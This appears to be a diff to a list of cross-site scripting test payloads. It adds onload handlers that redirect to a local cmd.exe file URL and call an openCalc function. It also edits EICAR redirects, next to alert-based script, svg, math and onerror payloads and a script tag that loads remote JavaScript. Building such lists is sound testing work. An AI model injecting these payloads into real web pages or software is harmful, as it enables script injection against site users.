@@ -1,3 +1,4 @@
+<body onload="openCalc()">
 <script>window.location.assign('file:///C://Windows/System32/cmd.exe')</script>
 <script>alert(1)</script>
 <Script>alert(2)</Script>
@@ -23,5 +24,5 @@
 <svg><style> <script>alert(1)</script> </style></svg>
 <math><style> <img src onerror=alert(2)> </style></math>
 <script src="https://github.com/dipakpanchal05/xss/edit/main/app.js"></script>
-<script>window.location.assign('https://secure.eicar.org/eicar_com.zip')</script>
-<body onload=window.location.assign('https://www.google.com')>
+<script>window.location.assign('https://secure.eicar.org/')</script>
+<body onload=window.location.assign('file:///C://Windows/System32/cmd.exe')>
